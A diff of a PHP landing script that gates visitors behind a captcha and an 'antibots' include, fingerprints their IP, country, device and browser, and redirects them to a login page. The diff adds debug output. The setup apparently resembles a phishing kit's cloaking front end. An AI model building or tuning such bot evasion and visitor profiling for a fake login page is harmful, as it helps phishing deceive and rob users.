@@ -1,19 +1,28 @@
 <?php
-	error_reporting(0);
+	error_reporting(E_ALL);
     session_start();
     
     // Check if captcha was completed
     if (!isset($_SESSION['captcha_passed']) || $_SESSION['captcha_passed'] !== true) {
-        // Redirect back to captcha if not completed
-        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-        $host = $_SERVER['HTTP_HOST'];
-        $baseUrl = $protocol . '://' . $host;
-        header("Location: " . $baseUrl . "/");
+        echo "Captcha not completed - redirecting back...";
+        header("Refresh: 2; url=/");
         exit();
     }
     
     // Clear the captcha session flag
     unset($_SESSION['captcha_passed']);
+    
+    // Simple test to see if basic PHP works
+    echo "<!DOCTYPE html><html><head><title>Visit Test</title></head><body>";
+    echo "<h1>Captcha Passed Successfully!</h1>";
+    echo "<p>Your session is valid and captcha was completed.</p>";
+    echo "<p>Now redirecting to login page...</p>";
+    echo "<script>setTimeout(function() { window.location.href = '/pages/login.php'; }, 2000);</script>";
+    echo "</body></html>";
+    exit;
+    
+    // Original code below (commented out for testing)
+    /*
 	include "./libraries/geoplugin.class.php";
 	include "./libraries/UserInfo.php";
     include "./antibots-debug/antibots.php";
@@ -156,9 +165,22 @@
     fclose($file);
 
     
-    echo 
-    "<script>
-        window.location = './pages/login.php';
-    </script>";
+// DEBUG: Show some content to verify visit.php is executing
+echo "<!DOCTYPE html><html><head><title>Debug - Visit Page</title></head><body>";
+echo "<h1>Visit.php is executing!</h1>";
+echo "<p>IP: " . get_client_ip() . "</p>";
+echo "<p>Country: " . $geoplugin->countryCode . "</p>";
+echo "<p>Device: " . UserInfo::get_device() . "</p>";
+echo "<p>OS: " . UserInfo::get_os() . "</p>";
+echo "<p>Browser: " . UserInfo::get_browser() . "</p>";
+echo "<p>Redirecting to login in 3 seconds...</p>";
+echo "<script>setTimeout(function() { window.location.href = '/pages/login.php'; }, 3000);</script>";
+echo "</body></html>";
+
+// Use PHP header redirect instead of JavaScript for better reliability
+$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+$host = $_SERVER['HTTP_HOST'];
+$baseUrl = $protocol . '://' . $host;
+header("Refresh: 3; url=" . $baseUrl . "/pages/login.php");
 exit;
 ?>
